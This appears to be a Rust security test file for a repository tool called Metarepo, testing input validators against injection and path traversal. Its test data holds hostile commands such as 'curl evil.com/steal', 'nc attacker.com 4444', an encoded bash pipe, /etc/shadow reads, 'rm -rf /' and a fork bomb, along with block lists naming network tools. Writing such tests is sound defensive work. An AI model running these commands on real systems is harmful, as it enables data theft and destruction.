// Security Test Suite for Metarepo
// This file contains security-focused tests to validate protection against common vulnerabilities

use std::process::Command;
use std::path::{Path, PathBuf};
use tempfile::TempDir;

#[cfg(test)]
mod command_injection_tests {
    use super::*;

    /// Test that shell metacharacters are properly escaped or rejected
    #[test]
    fn test_shell_metacharacter_injection() {
        let dangerous_inputs = vec![
            "test; cat /etc/passwd",
            "test && curl evil.com/steal",
            "test | nc attacker.com 4444",
            "test `whoami`",
            "test $(cat /etc/shadow)",
            "test\n/bin/sh",
            "test;{echo,YmFzaCAtaQ==}|{base64,-d}|bash",
            "test' OR '1'='1",
            "test\"; DROP TABLE projects; --",
            "test\x00/etc/passwd",
            "test%20%26%26%20id",
            "test$IFS$()cat$IFS$()/etc/passwd",
        ];

        for input in dangerous_inputs {
            // This should validate that the input is rejected or safely handled
            assert!(
                !is_safe_command_input(input),
                "Dangerous input should be rejected: {}",
                input
            );
        }
    }

    /// Test that command arguments cannot break out of their context
    #[test]
    fn test_argument_injection() {
        let dangerous_args = vec![
            "--help; rm -rf /",
            "-o /etc/passwd",
            "--output=|bash",
            "-exec /bin/sh",
            "--",
            "-",
        ];

        for arg in dangerous_args {
            assert!(
                !is_safe_argument(arg),
                "Dangerous argument should be rejected: {}",
                arg
            );
        }
    }

    /// Helper function to validate command input safety
    fn is_safe_command_input(input: &str) -> bool {
        // Check for shell metacharacters and dangerous patterns
        let dangerous_patterns = [
            ";", "&&", "||", "|", "`", "$(",  ")", "\n", "\r",
            ">>", "<<", ">", "<", "&",
            "../", "..\\",
            "\x00", "%00",
            "\\", "'", "\"",
        ];

        for pattern in &dangerous_patterns {
            if input.contains(pattern) {
                return false;
            }
        }

        // Check for suspicious command patterns
        let suspicious_commands = [
            "bash", "sh", "zsh", "fish", "cmd", "powershell",
            "eval", "exec", "system",
            "curl", "wget", "nc", "netcat",
            "rm", "del", "format",
        ];

        let lower = input.to_lowercase();
        for cmd in &suspicious_commands {
            if lower.contains(cmd) {
                return false;
            }
        }

        true
    }

    fn is_safe_argument(arg: &str) -> bool {
        // Reject arguments that could be interpreted as options
        if arg.starts_with('-') {
            return false;
        }

        // Apply same safety checks as command input
        is_safe_command_input(arg)
    }
}

#[cfg(test)]
mod path_traversal_tests {
    use super::*;

    #[test]
    fn test_path_traversal_attempts() {
        let dangerous_paths = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "test/../../../root",
            "test/./../../etc",
            "test%2f..%2f..%2fetc",
            "test\x00../../etc",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "file:///etc/passwd",
            "test/../../../../../../../../etc/passwd",
        ];

        let base_dir = TempDir::new().unwrap();
        let base_path = base_dir.path();

        for path in dangerous_paths {
            assert!(
                validate_project_path(base_path, path).is_err(),
                "Path traversal should be detected: {}",
                path
            );
        }
    }

    #[test]
    fn test_symlink_traversal() {
        let temp_dir = TempDir::new().unwrap();
        let base_path = temp_dir.path();

        // Create a symlink pointing outside the workspace
        let symlink_path = base_path.join("evil_link");
        #[cfg(unix)]
        std::os::unix::fs::symlink("/etc/passwd", &symlink_path).unwrap();

        // Verify that following the symlink is prevented
        assert!(
            validate_project_path(base_path, "evil_link").is_err(),
            "Symlink traversal should be prevented"
        );
    }

    #[test]
    fn test_absolute_path_rejection() {
        let base_dir = TempDir::new().unwrap();
        let base_path = base_dir.path();

        let absolute_paths = vec![
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            "\\\\server\\share\\sensitive",
        ];

        for path in absolute_paths {
            assert!(
                validate_project_path(base_path, path).is_err(),
                "Absolute path should be rejected: {}",
                path
            );
        }
    }

    /// Validate that a path stays within the base directory
    fn validate_project_path(base: &Path, untrusted: &str) -> Result<PathBuf, String> {
        // Reject absolute paths
        if untrusted.starts_with('/') || untrusted.starts_with('\\') {
            return Err("Absolute paths not allowed".to_string());
        }

        // Reject path traversal attempts
        if untrusted.contains("..") {
            return Err("Path traversal detected".to_string());
        }

        // Reject URL schemes
        if untrusted.contains("://") {
            return Err("URL schemes not allowed".to_string());
        }

        // Reject null bytes
        if untrusted.contains('\x00') {
            return Err("Null bytes not allowed".to_string());
        }

        let joined = base.join(untrusted);

        // Canonicalize and verify the path stays within bounds
        match joined.canonicalize() {
            Ok(canonical) => {
                let base_canonical = base.canonicalize()
                    .map_err(|e| format!("Failed to canonicalize base: {}", e))?;

                if !canonical.starts_with(&base_canonical) {
                    return Err("Path escapes base directory".to_string());
                }

                Ok(canonical)
            }
            Err(_) => Err("Path does not exist or cannot be resolved".to_string()),
        }
    }
}

#[cfg(test)]
mod environment_variable_tests {
    use super::*;

    #[test]
    fn test_dangerous_environment_variables() {
        let dangerous_vars = vec![
            ("LD_PRELOAD", "/tmp/evil.so"),
            ("LD_LIBRARY_PATH", "/tmp:/evil"),
            ("PATH", "/tmp:$PATH"),
            ("BASH_ENV", "/tmp/evil.sh"),
            ("ENV", "/tmp/evil.sh"),
            ("PERL5OPT", "-Mwarnings;system('id')"),
            ("PYTHONPATH", "/tmp/evil"),
            ("NODE_OPTIONS", "--require=/tmp/evil.js"),
        ];

        for (key, value) in dangerous_vars {
            assert!(
                !is_safe_env_var(key, value),
                "Dangerous environment variable should be rejected: {}={}",
                key, value
            );
        }
    }

    fn is_safe_env_var(key: &str, value: &str) -> bool {
        // Blocklist of dangerous environment variables
        let dangerous_keys = [
            "LD_PRELOAD", "LD_LIBRARY_PATH",
            "BASH_ENV", "ENV",
            "PERL5OPT", "PERL5LIB",
            "PYTHONPATH", "PYTHONSTARTUP",
            "NODE_OPTIONS", "NODE_PATH",
            "RUBYOPT", "RUBYLIB",
        ];

        if dangerous_keys.contains(&key) {
            return false;
        }

        // Check for suspicious values
        if value.contains("..") || value.starts_with('/') {
            return false;
        }

        true
    }
}

#[cfg(test)]
mod resource_exhaustion_tests {
    use super::*;
    use std::time::Duration;

    #[test]
    fn test_fork_bomb_prevention() {
        let fork_bombs = vec![
            ":(){ :|:& };:",
            "while true; do :; done",
            "yes | head -n 1000000000",
        ];

        for bomb in fork_bombs {
            assert!(
                !is_safe_script(bomb),
                "Fork bomb should be detected: {}",
                bomb
            );
        }
    }

    #[test]
    fn test_excessive_resource_consumption() {
        // Test commands that could consume excessive resources
        let resource_intensive = vec![
            "find / -type f",
            "grep -r pattern /",
            "tar -czf /dev/stdout /",
        ];

        for cmd in resource_intensive {
            assert!(
                !is_safe_script(cmd),
                "Resource-intensive command should be detected: {}",
                cmd
            );
        }
    }

    fn is_safe_script(script: &str) -> bool {
        // Check for known fork bomb patterns
        if script.contains(":(){") || script.contains("while true") {
            return false;
        }

        // Check for recursive operations on root
        if script.contains("/ ") || script.ends_with("/") {
            if script.contains("find") || script.contains("grep") || script.contains("rm") {
                return false;
            }
        }

        true
    }
}

#[cfg(test)]
mod input_validation_tests {
    use regex::Regex;

    #[test]
    fn test_branch_name_validation() {
        let valid_branches = vec![
            "main",
            "feature/new-feature",
            "bugfix-123",
            "release_v1.0.0",
        ];

        let invalid_branches = vec![
            "../main",
            "feature/../../../etc",
            "test;rm -rf /",
            "test|cat /etc/passwd",
            "test$(whoami)",
            "test`id`",
            "-main",
            "--help",
        ];

        for branch in valid_branches {
            assert!(
                validate_branch_name(branch).is_ok(),
                "Valid branch should be accepted: {}",
                branch
            );
        }

        for branch in invalid_branches {
            assert!(
                validate_branch_name(branch).is_err(),
                "Invalid branch should be rejected: {}",
                branch
            );
        }
    }

    #[test]
    fn test_script_name_validation() {
        let valid_scripts = vec![
            "test",
            "build",
            "deploy-prod",
            "test_integration",
            "npm:build",
        ];

        let invalid_scripts = vec![
            "../test",
            "test;whoami",
            "test|id",
            "test&&ls",
            "test`pwd`",
            "/bin/sh",
            "../../etc/passwd",
        ];

        for script in valid_scripts {
            assert!(
                validate_script_name(script).is_ok(),
                "Valid script name should be accepted: {}",
                script
            );
        }

        for script in invalid_scripts {
            assert!(
                validate_script_name(script).is_err(),
                "Invalid script name should be rejected: {}",
                script
            );
        }
    }

    fn validate_branch_name(name: &str) -> Result<(), String> {
        // Only allow safe characters
        let re = Regex::new(r"^[a-zA-Z0-9\-_/\.]+$").unwrap();
        if !re.is_match(name) {
            return Err("Invalid characters in branch name".to_string());
        }

        // Prevent path traversal
        if name.contains("..") {
            return Err("Path traversal attempt detected".to_string());
        }

        // Prevent option injection
        if name.starts_with('-') {
            return Err("Branch name cannot start with dash".to_string());
        }

        Ok(())
    }

    fn validate_script_name(name: &str) -> Result<(), String> {
        // Only allow alphanumeric and limited special chars
        let re = Regex::new(r"^[a-zA-Z0-9\-_:]+$").unwrap();
        if !re.is_match(name) {
            return Err("Invalid characters in script name".to_string());
        }

        // Prevent path traversal
        if name.contains("..") || name.contains('/') || name.contains('\\') {
            return Err("Path characters not allowed in script name".to_string());
        }

        Ok(())
    }
}

#[cfg(test)]
mod plugin_security_tests {
    use super::*;

    #[test]
    fn test_plugin_path_validation() {
        let dangerous_plugin_paths = vec![
            "../../../usr/bin/malicious",
            "/etc/passwd",
            "../../.ssh/id_rsa",
            "plugins/../../../etc/shadow",
        ];

        for path in dangerous_plugin_paths {
            assert!(
                !is_safe_plugin_path(path),
                "Dangerous plugin path should be rejected: {}",
                path
            );
        }
    }

    fn is_safe_plugin_path(path: &str) -> bool {
        // Plugin paths should be relative and within the plugins directory
        if path.starts_with('/') || path.starts_with('\\') {
            return false;
        }

        if path.contains("..") {
            return false;
        }

        true
    }
}

#[cfg(test)]
mod integration_security_tests {
    use super::*;

    #[test]
    #[ignore] // Run with: cargo test --ignored
    fn test_end_to_end_command_injection_prevention() {
        // This test requires actual metarepo binary
        let output = Command::new("cargo")
            .args(&["run", "--", "exec", "--", "echo test; cat /etc/passwd"])
            .output()
            .expect("Failed to execute command");

        // The command should either fail or not execute the injected command
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(
            !stdout.contains("root:"),
            "Command injection was not prevented"
        );
    }

    #[test]
    #[ignore]
    fn test_script_injection_prevention() {
        // Test that script names with injection attempts are rejected
        let output = Command::new("cargo")
            .args(&["run", "--", "run", "test;id"])
            .output()
            .expect("Failed to execute command");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("Invalid") || stderr.contains("not found"),
            "Script injection was not prevented"
        );
    }
}

// Export test utilities for use in other test modules
pub mod test_utils {
    use super::*;

    pub fn create_safe_test_environment() -> TempDir {
        let temp_dir = TempDir::new().unwrap();

        // Set restrictive permissions on Unix systems
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            use std::fs;

            let mut perms = fs::metadata(temp_dir.path()).unwrap().permissions();
            perms.set_mode(0o700);
            fs::set_permissions(temp_dir.path(), perms).unwrap();
        }

        temp_dir
    }

    pub fn assert_command_safe(command: &str) -> bool {
        // Comprehensive safety check for commands
        let dangerous_patterns = [
            ";", "&&", "||", "|", "`", "$(",
            ">>", "<<", ">", "<", "&",
            "\n", "\r", "\x00",
        ];

        for pattern in &dangerous_patterns {
            if command.contains(pattern) {
                return false;
            }
        }

        true
    }
}